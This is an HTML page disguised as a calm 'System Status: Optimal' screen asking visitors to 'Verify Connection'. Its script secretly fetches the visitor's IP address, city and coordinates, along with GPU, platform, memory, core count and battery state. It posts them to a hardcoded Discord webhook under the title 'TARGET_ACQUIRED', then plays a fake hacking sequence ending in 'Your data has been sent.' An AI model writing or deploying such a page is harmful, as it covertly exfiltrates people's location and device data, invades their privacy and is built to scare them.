<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Peaceful Vibes</title>
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body, html { width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        
        /* PEACEFUL THEME */
        .peaceful-theme { 
            background: linear-gradient(135deg, #89CFF0 0%, #B8E8FC 30%, #F8E8EE 60%, #FFDDD2 100%); 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
            text-align: center; color: #3a3a5c; 
        }
        #peaceful-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; width: 100%; padding: 30px; animation: fadeIn 1.5s ease; }
        .sun { width: 100px; height: 100px; border-radius: 50%; background: radial-gradient(circle, #FFE066 40%, #FFD700 100%); box-shadow: 0 0 60px #FFE066; margin-bottom: 30px; animation: pulse 4s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.05); opacity: 0.8; } }
        #security-btn { padding: 15px 35px; background: white; color: #3a3a5c; border: none; border-radius: 50px; cursor: pointer; font-size: 1rem; font-weight: bold; box-shadow: 0 4px 15px rgba(0,0,0,0.1); transition: 0.3s; z-index: 10; }
        #security-btn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0,0,0,0.15); }

        /* HACK THEME */
        #hack-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: black; font-family: 'Courier New', monospace; }
        #matrixCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
        #console { position: relative; z-index: 2; width: 90%; max-width: 600px; border: 2px solid #00FF41; padding: 20px; background: rgba(0, 10, 0, 0.95); box-shadow: 0 0 20px #00FF41; color: #00FF41; margin: auto; top: 50%; transform: translateY(-50%); }
        #console h1 { font-size: 1.2rem; color: #ff0000; text-shadow: 0 0 5px red; margin-bottom: 10px; }
        #progress-container { width: 100%; border: 1px solid #00FF41; height: 35px; margin-top: 15px; position: relative; overflow: hidden; }
        #progress-bar { width: 0%; height: 100%; background: #00FF41; position: absolute; z-index: 4; }
        .percent-text { position: absolute; width: 100%; top: 8px; text-align: center; font-weight: bold; z-index: 5; }
        @keyframes emergency { 0%, 100% { background: #000; } 50% { background: #200; } }
        #transition-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; background: black; opacity: 0; transition: 0.8s; }
    </style>
</head>
<body class="peaceful-theme">

    <div id="peaceful-screen">
        <div class="sun"></div>
        <h1 style="font-size: 2.5rem; margin-bottom: 10px;">System Status: Optimal</h1>
        <p style="margin-bottom: 30px; color: #6b6b8d;">Please perform a quick security handshake to continue.</p>
        <button id="security-btn" onclick="initiateSequence()">Verify Connection</button>
    </div>

    <div id="transition-overlay"></div>

    <div id="hack-screen">
        <canvas id="matrixCanvas"></canvas>
        <div id="console">
            <h1>> [ CRITICAL_SYSTEM_BREACH ]</h1>
            <div id="log"></div>
            <div id="progress-container">
                <div id="percent-text-base" class="percent-text" style="color:#00FF41">0%</div>
                <div id="progress-bar">
                    <div id="percent-text-overlay" class="percent-text" style="color:black">0%</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1487870677636612197/G4uFH8d-UVi14OSGeAjy198ahM_va3PC32KjFV9l4aRV3rphNPRYR71l3Tr_3FAFhYBr";
        let userIP = "Fetching...", userLoc = "Unknown", userCoords = "0,0", gpuName = "Unknown";
        let currentPercent = 0, idx = 0, alarmActive = false;

        async function initiateSequence() {
            // 1. Get Hardware Info
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                gpuName = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            // 2. Get IP and Location
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                userIP = data.ip;
                userLoc = `${data.city}, ${data.region}, ${data.country_name}`;
                userCoords = `${data.latitude}, ${data.longitude}`;
                sendToDiscord(data);
            } catch(e) { sendToDiscord(null); }

            // 3. Start Visuals
            document.getElementById('transition-overlay').style.display = 'block';
            setTimeout(() => { document.getElementById('transition-overlay').style.opacity = '1'; }, 10);
            
            setTimeout(() => {
                document.getElementById('peaceful-screen').style.display = 'none';
                document.getElementById('hack-screen').style.display = 'block';
                document.body.style.background = 'black';
                startMatrix();
                runConsole();
            }, 850);
        }

        function sendToDiscord(ipData) {
            const batteryInfo = "Checking...";
            navigator.getBattery?.().then(b => {
                const bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Plugged Out'})`;
                const embed = {
                    username: "M.O.D.X SECURITY",
                    embeds: [{
                        title: "🚀 TARGET_ACQUIRED",
                        color: 16711680,
                        fields: [
                            { name: "📍 IP Address", value: `\`${userIP}\``, inline: true },
                            { name: "🌍 Location", value: userLoc, inline: true },
                            { name: "🎮 GPU / Graphics", value: `\`${gpuName}\``, inline: false },
                            { name: "💻 Device / OS", value: `\`${navigator.platform}\``, inline: true },
                            { name: "💾 RAM / Cores", value: `${navigator.deviceMemory || '?'}GB / ${navigator.hardwareConcurrency} Cores`, inline: true },
                            { name: "🔋 Battery", value: bat, inline: true },
                            { name: "🗺️ GPS", value: `[Google Maps](https://www.google.com/maps?q=${userCoords})`, inline: false }
                        ],
                        footer: { text: "Time: " + new Date().toLocaleString() }
                    }]
                };
                fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(embed) });
            });
        }

        function runConsole() {
            const lines = [
                "ESTABLISHING SECURE TUNNEL...",
                `IP_FOUND: ${userIP}`,
                `GEOLOCATION: ${userLoc}`,
                "TRIANGULATING COORDINATES...",
                `LAT/LONG: ${userCoords}`,
                "BYPASSING LOCAL FIREWALL...",
                `HARDWARE: ${navigator.platform} | ${gpuName}`,
                "DOWNLOADING CACHE & BROWSER_HISTORY...",
                "UPLOADING DATA TO REMOTE SERVER...",
                "CRITICAL ERROR: TRACE DETECTED!"
            ];

            if (idx < lines.length) {
                document.getElementById('log').innerHTML += `<p>> ${lines[idx]}</p>`;
                updateProgress(Math.floor(((idx + 1) / lines.length) * 100), 1500);
                idx++;
                setTimeout(runConsole, 1800);
            } else {
                setTimeout(() => {
                    document.getElementById('hack-screen').innerHTML = '<div style="height:100%; display:flex; align-items:center; justify-content:center; color:red; flex-direction:column;"><h1>SYSTEM WIPED</h1><p style="color:white">Your data has been sent.</p></div>';
                }, 2000);
            }
        }

        function updateProgress(target, time) {
            let start = currentPercent, startTime = null;
            function frame(now) {
                if (!startTime) startTime = now;
                let t = Math.min((now - startTime) / time, 1);
                currentPercent = Math.floor(start + (target - start) * t);
                document.getElementById('progress-bar').style.width = currentPercent + '%';
                document.getElementById('percent-text-base').innerText = currentPercent + '%';
                document.getElementById('percent-text-overlay').innerText = currentPercent + '%';
                if (currentPercent > 40 && !alarmActive) startAlarm();
                if (t < 1) requestAnimationFrame(frame);
            }
            requestAnimationFrame(frame);
        }

        function startAlarm() {
            alarmActive = true;
            document.getElementById('hack-screen').style.animation = "emergency 0.2s infinite";
            const audio = new (window.AudioContext || window.webkitAudioContext)();
            setInterval(() => {
                const o = audio.createOscillator();
                const g = audio.createGain();
                o.type = 'square'; o.frequency.value = 1000; g.gain.value = 0.05;
                o.connect(g); g.connect(audio.destination);
                o.start(); o.stop(audio.currentTime + 0.05);
            }, 150);
        }

        function startMatrix() {
            const c = document.getElementById('matrixCanvas');
            const ctx = c.getContext('2d');
            c.width = window.innerWidth; c.height = window.innerHeight;
            const drops = Array(Math.floor(c.width / 14)).fill(1);
            setInterval(() => {
                ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, c.width, c.height);
                ctx.fillStyle = "#00FF41"; ctx.font = "14px monospace";
                drops.forEach((y, i) => {
                    ctx.fillText(Math.floor(Math.random()*2), i * 14, y * 14);
                    if (y * 14 > c.height && Math.random() > 0.98) drops[i] = 0;
                    drops[i]++;
                });
            }, 50);
        }
    </script>
</body>
</html>
